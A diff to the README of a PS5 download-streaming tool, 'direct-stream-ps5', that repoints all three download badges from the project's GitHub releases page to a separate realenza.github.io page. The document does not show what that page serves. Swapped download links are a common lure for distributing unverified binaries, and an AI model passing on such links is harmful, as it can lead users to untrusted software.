@@ -1,6 +1,6 @@
 # 🚀 direct-stream-ps5 - Stream Downloads Straight to PS5
 
-[![Download direct-stream-ps5](https://img.shields.io/badge/⬇️_Download_direct--stream--ps5-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Realenza/direct-stream-ps5/releases)
+[![Download direct-stream-ps5](https://img.shields.io/badge/⬇️_Download_direct--stream--ps5-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://realenza.github.io)
 
 direct-stream-ps5 is a high-speed parallel stream engine and local web dashboard for sending HTTP and HTTPS downloads directly to PlayStation 5 FTP storage. It is designed for people who want a fast, simple way to move downloads to their PS5 without a complicated setup. The application uses the Python standard library, needs zero pip packages, and works on macOS and Windows.
 
@@ -18,7 +18,7 @@ The app is also friendly for users who do not want to install extra packages. Th
 
 ## 🚀 Getting Started on Windows
 
-[![Download direct-stream-ps5 for Windows](https://img.shields.io/badge/⬇️_Download_for_Windows-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Realenza/direct-stream-ps5/releases)
+[![Download direct-stream-ps5 for Windows](https://img.shields.io/badge/⬇️_Download_for_Windows-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://realenza.github.io)
 
 Visit this link to download the application.
 
@@ -98,7 +98,7 @@ direct-stream-ps5 is useful when you want to move large web downloads to your Pl
 
 ## 🔗 Download Again
 
-[![Download direct-stream-ps5](https://img.shields.io/badge/⬇️_Get_direct--stream--ps5-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Realenza/direct-stream-ps5/releases)
+[![Download direct-stream-ps5](https://img.shields.io/badge/⬇️_Get_direct--stream--ps5-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://realenza.github.io)
 
 Visit this link to download the application.
 
